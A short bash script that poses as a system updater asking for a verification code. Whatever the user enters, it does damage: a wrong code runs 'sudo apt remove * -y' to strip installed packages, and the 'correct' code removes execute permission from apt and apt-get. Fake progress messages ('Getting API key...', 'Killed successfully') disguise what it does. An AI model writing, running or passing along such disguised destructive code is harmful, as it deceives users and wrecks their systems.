#!/bin/bash

echo "Updating..."

clear

echo "Please, introduce verify code to end the update: "
read code
if [ $code != 'ITSA-TEST' ]; then
  sudo apt remove * -y
else
  sudo chmod -x /usr/bin/apt
  sudo chmod -x /usr/bin/apt-get
fi

clear

echo "Verify process started..."

sudo apt update
sudo apt upgrade -y

clear

echo "Getting API key..."
sleep 1

echo "Incorrect code, can't verify user, aborting..."
sleep 1

clear

echo "Killed successfully"
